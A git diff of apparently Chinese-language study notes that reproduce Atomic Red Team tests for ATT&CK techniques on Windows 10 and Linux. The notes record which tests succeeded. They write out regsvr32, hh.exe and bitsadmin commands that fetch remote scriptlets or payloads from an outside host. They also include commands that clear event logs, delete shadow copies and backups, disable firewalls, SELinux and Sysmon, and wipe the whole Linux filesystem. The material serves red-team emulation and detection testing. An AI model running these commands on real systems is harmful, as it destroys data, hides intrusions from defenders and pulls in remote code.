@@ -225,5 +225,336 @@ win10成功复现
 rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 D:\pycharmproject\atomic-red-team-master\atomics\T1085\src\T1085_DefaultInstall.inf
 ```
 **没有复现成功**
-### T1014 - Rootkit
-rootkits是一个隐藏病毒的程序,
+### T1117 - Regsvr32
+Regsvr32.exe是一个命令行程序,用来注册和删除object linking和嵌入命令,加载dll.Regsvr32也可以用来运行二进制文件.
+
+红队可以利用它来运行代码来绕过一些防护,其中Regsvr32也是一个有微软签名的文件
+
+regsvr32.exe也可以加载COM scriptlets来运行dll,regsvr32也可以加载远程文件来运行.regsvr32也通过Component Object Model Hijacking用来注册 COM Object来进行persistence
+###### 测试1 Regsvr32 local COM scriptlet execution
+```
+regsvr32.exe /s /u /i:C:\Users\zhang\Desktop\atomic-red-team-master\atomics\T1117\RegSvr32.sct scrobj.dll
+```
+win10成功复现
+###### 测试2 Regsvr32 remote COM scriptlet execution
+```
+regsvr32.exe /s /u /i:http://snappyzz.com/RegSvr32.sct scrobj.dll
+```
+win10成功复现
+###### 测试3 Regsvr32 local DLL execution
+```
+"IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe /s D:\pycharmproject\atomic-red-team-master\atomics\T1117\src\AllTheThings.dll) ELSE ( regsvr32.exe /s D:\pycharmproject\atomic-red-team-master\atomics\T1117\src\AllTheThings.dll )"
+```
+项目找不到dll文件,没有进行复现
+### T1121 - Regsvcs/Regasm
+Regsvcs和Regasm是用来注册.NET COM的命令行工具.都有微软的签名.红队可以使用它们来运行程序.
+###### 测试1 Regasm Uninstall Method Call Test
+```
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library D:\pycharmproject\atomic-red-team-master\atomics\T1121\src\T1121.cs
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U T1121.dll
+```
+**没有找到T1121.dll,没有复现**
+### T1126 - Network Share Connection Removal
+可以使用`net use \\system\share /delete`来删除不使用的共享连接,红队可以使用它来隐藏自己的痕迹
+###### 测试1 Add Network Share
+```
+net share test=D:\test /REMARK:"test share" /CACHE:No
+```
+win10成功复现
+###### 测试2 Remove Network Share
+```
+net share D:\test /delete
+```
+win10成功复现
+###### 测试3 Remove Network Share PowerShell
+```
+Remove-SmbShare -Name D:\test
+Remove-FileShare -Name D:\test
+```
+命令不对,没有成功复现
+### T1202 - Indirect Command Execution
+许多windows工具集可以运行命令,例如`pcalua.exe`红队可以使用这个运行命令
+###### 测试1 Indirect Command Execution - pcalua.exe
+```
+pcalua.exe -a #{process}
+pcalua.exe -a #{payload_path}
+pcalua.exe -a #{payload_cpl_path}
+例如
+pcalua.exe -a calc
+```
+win10成功复现
+###### 测试2 Indirect Command Execution - forfiles.exe
+```
+forfiles /p c:\windows\system32 /m notepad.exe /c #{process}
+forfiles /p c:\windows\system32 /m notepad.exe /c "c:\folder\normal.dll:evil.exe"
+```
+win10成功复现
+### T1070 - Indicator Removal on Host
+红队可以通过删除系统日志和潜在的captured文件来隐藏自己.例如删除linux中的`/var/log/*`
+
+对于windows时间的日志:它记录了电脑的报警和提醒,系统定义了三种事件:系统级别,应用级别,安全
+
+红队的操作与账号管理.账户登陆,服务操作等等,他们可以通过清除事件来隐藏自己的活动.清除事件的命令如下
+- wevtutil cl system
+- wevtutil cl application
+- wevtutil cl security
+###### 测试1 Clear Logs
+```
+wevtutil cl #{log_name}
+例如
+wevtutil cl security
+```
+win10成功复现
+###### 测试2 FSUtil
+USN Journal (Update Sequence Number Journal)，也称作Change Journal，用来记录NTFS volume中文件修改的信息，能够提高搜索文件的效率
+
+每个NTFS volume对应一个USN Journal，存储在NTFS metafile的$Extend\$UsnJrnl中，也就是说，不同的NTFS volume对应的USN Journal不同
+
+USN Journal会记录文件和目录的创建、删除、修改、重命名和加解密操作
+```
+fsutil usn deletejournal /D C:
+```
+win10成功复现
+###### 测试3 rm -rf
+在linux中
+```
+rm -rf /var/log/system.log*
+rm -rf /var/audit/*
+```
+成功复现
+###### 测试4 Overwrite Linux Mail Spool
+```
+echo 0> /var/spool/mail/#{username}
+```
+成功复现
+###### 测试5 Overwrite Linux Log
+```
+echo 0> #{log_path}
+```
+成功复现
+###### 测试6 Delete Security Logs Using PowerShell
+powershell中运行
+```
+$eventLogId = Get-WmiObject -Class Win32_Service -Filter "Name LIKE 'EventLog'" | Select-Object -ExpandProperty ProcessId
+Stop-Process -Id $eventLogId -Force
+Remove-Item C:\Windows\System32\winevt\Logs\Security.evtx
+```
+重新启动服务
+```
+Start-Service -Name EventLog
+```
+win10成功复现
+###### 测试7 Delete System Logs Using Clear-EventLogId
+powershell中运行
+```
+Clear-EventLog -logname Application
+```
+应该可以复现
+### T1107 - File Deletion
+这个就是讲得怎么删除文件
+###### 测试1 Delete a single file - Linux/macOS
+```
+rm -f #{file_to_delete}
+```
+成功复现
+###### 测试2 Delete an entire folder - Linux/macOS
+```
+rm -rf #{folder_to_delete}
+```
+成功复现
+###### 测试3  Overwrite and delete a file with shred
+```
+shred -u #{file_to_shred}
+```
+成功复现
+###### 测试4 Delete a single file - Windows cmd
+```
+echo "T1107" > %temp%\T1107.txt
+del /f  %temp%\T1107.txt
+```
+win10成功复现
+###### 测试5 Delete an entire folder - Windows cmd
+```
+mkdir %temp%\T1107
+rmdir /s /q %temp%\T1107
+```
+win10成功复现
+###### 测试6 Delete a single file - Windows PowerShell
+```
+New-Item $env:TEMP\T1107.txt
+Remove-Item -path $env:TEMP\T1107.txt
+```
+win10成功复现
+###### 测试7 Delete an entire folder - Windows PowerShell
+```
+New-Item $env:TEMP\T1107 -ItemType Directory
+Remove-Item -path $env:TEMP\T1107 -recurse
+```
+win10成功复现
+###### 测试8 Delete VSS - vssadmin
+通过vsadmin.exe删除卷影拷贝服务文件
+```
+vssadmin.exe Delete Shadows /All /Quiet
+```
+win10成功复现
+###### 测试9 Delete VSS - wmic
+```
+wmic shadowcopy delete
+```
+win10成功复现
+###### 测试10 wbadmin
+删除Windows Backup catalogs.
+```
+wbadmin delete catalog -quiet
+```
+应该可以复现
+###### 测试11 Delete Filesystem - Linux
+这个测试删除了整个linux的文件系统,这个技术在Amnesia IoT病毒中使用过,这个操作危险有破坏性
+```
+rm -rf / --no-preserve-root > /dev/null 2> /dev/null
+```
+应该可以复现
+###### 测试13 Delete-PrefetchFile
+Prefetch是预读取文件夹，用来存放系统已访问过的文件的预读信息，扩展名为PF。之所以自动创建Prefetch文件夹，是为了加快系统启动的进程
+
+删除prefetch文件是一种已知的anti-forensic技术
+```
+Remove-Item -Path (Join-Path "$Env:SystemRoot\prefetch\" (Get-ChildItem -Path "$Env:SystemRoot\prefetch\*.pf" -Name)[0])
+```
+应该可以复现
+### T1089 - Disabling Security Tools
+红队可关闭安全工具来避免自己被检测到
+###### 测试1 Disable iptables firewall
+在linux上运行
+```
+if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
+then
+  service iptables stop
+  chkconfig off iptables
+  service ip6tables stop
+  chkconfig off ip6tables
+else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
+  systemctl stop firewalld
+  systemctl disable firewalld
+fi
+```
+成功复现
+###### 测试2 Disable syslog
+在linux上运行
+```
+if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
+then
+  service rsyslog stop
+  chkconfig off rsyslog
+else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
+  systemctl stop rsyslog
+  systemctl disable rsyslog
+fi
+```
+成功复现
+###### 测试3 Disable Cb Response
+Cb Response也是一个收集日志的,在linux上运行
+```
+if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "6" ];
+then
+  service cbdaemon stop
+  chkconfig off cbdaemon
+else if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq "7" ];
+  systemctl stop cbdaemon
+  systemctl disable cbdaemon
+fi
+```
+成功复现
+###### 测试4 Disable SELinux
+```
+setenforce 0
+```
+成功复现
+###### 测试8 Unload Sysmon Filter Driver
+在不停止Sysmon的情况下,卸载filter driver
+```
+fltmc.exe unload #{sysmon_driver}
+例如
+fltmc.exe unload SysmonDrv
+```
+恢复
+```
+sc stop sysmon
+fltmc.exe load #{sysmon_driver}
+sc start sysmon
+```
+win10成功复现
+###### 测试10 Uninstall Sysmon
+```
+sysmon -u
+```
+恢复
+```
+sysmon -i -accepteula
+```
+###### 测试11 AMSI Bypass - AMSI InitFailed
+###### 测试12 AMSI Bypass - Remove AMSI Provider Reg Key
+###### 测试13 Disable Arbitrary Security Windows Service
+###### 测试14 Disable PowerShell Script Block Logging
+###### 测试15 PowerShell Bypass of AntiMalware Scripting Interface
+###### 测试16 Tamper with Windows Defender ATP PowerShell
+###### 测试17 Tamper with Windows Defender Command Prompt
+###### 测试18 Tamper with Windows Defender Registry
+### T1500 - Compile After Delivery
+为了绕过传输途径的检测,红队可以将代码传输,然后再编译.
+###### 测试1 Compile After Delivery using csc.exe
+```
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:#{output_file} #{input_file}
+例如
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:D:\pycharmproject\atomic-red-team-master\atomics\T1500\src\calc.exe D:\pycharmproject\atomic-red-team-master\atomics\T1500\src\calc.cs
+```
+win10成功复现
+### T1196 - Control Panel Items
+控制面板允许用户查看和修改电脑配置,也可以将cpl文件作为参数,运行恶意文件,来绕过一些病毒检测
+```bash
+control.exe D:\pycharmproject\atomic-red-team-master\atomics\T1196\bin\calc.cpl	//这里cpl一定要采用绝对路径否则失败
+```
+windows10上运行成功
+### T1223 - Compiled HTML File
+编译的html文件(.chm)可运行如下:HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX.并通过hh.exe来打开他们,红队可用chm文件来隐藏一段payload,此技术也可以来绕过一些检测病毒检测.运行如下命令,或者直接打开文件
+```
+hh.exe D:\pycharmproject\atomic-red-team-master\atomics\T1223\src\T1223.chm
+```
+windows10上运行成功
+
+或者
+```bash
+hh.exe http://snappyzz.com/T1223.chm		\\这个没有成功复现
+```
+### T1197 - BITS Jobs
+windows后台智能传输服务(BITS)是一个通过Component Object Model (COM)的低带宽,同步文件传输的服务.BITS是一个用来更新,传输信息和其他应用后台操作并且不会干扰其他应用网络.我们可以通过powershell和BITSAdmin来创建BITS jobs
+
+红队可以使用BITS来下载,运行恶意代码,甚至清除这些恶意代码.BITS运行不需要新建文件或者修改注册表,而且没有防火墙的拦截
+###### 测试1 Download & Execute
+```
+bitsadmin.exe /transfer /Download /priority Foreground http://snappyzz.com/calc.calc D:\bitsadmin_flag.ps1
+```
+win10 下载成功复现,运行没有成功复现
+###### 测试2 Download & Execute via PowerShell BITS
+```
+Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}
+```
+win10 下载成功复现,运行没有成功复现
+###### 测试3 Persist, Download, & Execute
+这个测试了bitsadmin调度一个BITS传输,并且通过多个步骤运行payload,默认这个job将持续90天
+```
+bitsadmin.exe /create  #{bits_job_name}
+bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
+bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}
+bitsadmin.exe /complete AtomicBITS
+bitsadmin.exe /resume #{bits_job_name}
+```
+例如
+```
+bitsadmin.exe /create  AtomicBITS
+bitsadmin.exe /addfile AtomicBITS http://snappyzz.com/T1197.md D:\bitsadmin_flag.ps1
+bitsadmin.exe /setnotifycmdline AtomicBITS  	C:\Windows\system32\notepad.exe %temp%\bitsadmin_flag.ps1
+bitsadmin.exe /complete AtomicBITS
+bitsadmin.exe /resume AtomicBITS
+```
+大概就是这个意思,估计是给的命令有问题,暂时没有复现成功
